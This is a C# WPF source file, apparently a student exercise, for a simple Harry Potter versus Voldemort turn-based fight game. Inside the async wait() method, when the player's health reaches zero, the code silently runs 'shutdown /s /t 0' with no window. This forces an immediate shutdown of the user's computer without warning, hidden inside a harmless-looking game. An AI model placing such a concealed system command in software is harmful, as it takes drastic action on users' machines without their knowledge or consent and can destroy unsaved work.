using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace KlasserOgObjekter
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        BitmapImage HarryStandImg = new BitmapImage(new Uri("C:/Users/nico936d/Documents/S-2/Uge_34/Onsdag_KlasserOgObjeker/WPF_Gaming3/KlasserOgObjekter/HarryImg.png"));
        BitmapImage HarryAttackImg = new BitmapImage(new Uri("C:/Users/nico936d/Documents/S-2/Uge_34/Onsdag_KlasserOgObjeker/WPF_Gaming3/KlasserOgObjekter/HarryAttackImg.png"));
        BitmapImage VoldemortStandImg = new BitmapImage(new Uri("C:/Users/nico936d/Documents/S-2/Uge_34/Onsdag_KlasserOgObjeker/WPF_Gaming3/KlasserOgObjekter/VoldemortImg.png"));
        BitmapImage VoldemortAttackImg = new BitmapImage(new Uri("C:/Users/nico936d/Documents/S-2/Uge_34/Onsdag_KlasserOgObjeker/WPF_Gaming3/KlasserOgObjekter/VoldemortAttackImg.png"));

        Target Voldemort = new Target(100);
        Player Harry = new Player("Harry Potter", 100);
        public MainWindow()
        {
            InitializeComponent();
            
        }
        

        class Target
        {
            string Name = "Voldemort";
            int Health;
            int Strength;
            Random rnd = new Random();

            public Target(int health)
            {
                Health = health;
                Strength = rnd.Next(4, 15);
            }

            public int Health1 { get => Health; set => Health = value; }
            public int Strength1 { get => Strength; set => Strength = value; }

            public void TakeDamage(int dmgReceived)
            {
                Health = Health - dmgReceived;
            }

            public void Attack(Player player)
            {
                Random rnd = new Random();
                player.TakeDamage(Strength + rnd.Next(1, 8));
            }
        }

        class Player
        {
            string Name;
            int Health;
            int Strength;
            Random rnd = new Random();
            public Player(string name, int health)
            {
                Name = name;
                Health = health;
                Strength = rnd.Next(4, 15);
            }

            public string Name1 { get => Name; set => Name = value; }
            public int Health1 { get => Health; set => Health = value; }
            public int Strength1 { get => Strength; set => Strength = value; }

            public void Attack(Target target)
            {
                Random rnd = new Random();
                target.TakeDamage(Strength+rnd.Next(1, 8));
            }

            public void TakeDamage(int dmgReceived)
            {
                Health = Health - dmgReceived;
            }
        }

        
        
        
        

        private void PlayerAttack(object sender, RoutedEventArgs e)
        {
            HarryImg.Source = HarryAttackImg;
            Harry.Attack(Voldemort);
            PcHealth.Text = $"Pc Health: {Voldemort.Health1}";
            wait();
        }

        async void wait()
        {
            await Task.Delay(2000);
            HarryImg.Source = HarryStandImg;
            VoldemortImg.Source = VoldemortAttackImg;
            Voldemort.Attack(Harry);
            if(Harry.Health1 <= 0)
            {
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
            PlayerHealth.Text = $"Player Health: {Harry.Health1}";
            await Task.Delay(2000);
            VoldemortImg.Source = VoldemortStandImg;
        }
    }
}
